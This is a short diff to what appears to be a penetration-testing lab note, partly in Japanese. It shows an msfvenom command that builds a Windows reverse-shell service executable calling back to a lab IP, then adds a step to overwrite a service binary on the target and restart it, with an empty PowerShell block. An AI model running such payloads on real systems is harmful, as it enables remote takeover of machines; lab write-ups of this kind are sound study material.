@@ -41,3 +41,9 @@ SeTimeZonePrivilege           Change the time zone                 Enabled
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o cbssvcX64.exe
 ```
+
+- ターゲットでバックアップを取ったうえでファイルの上書き、サービスの再起動
+```powershell
+
+
+```
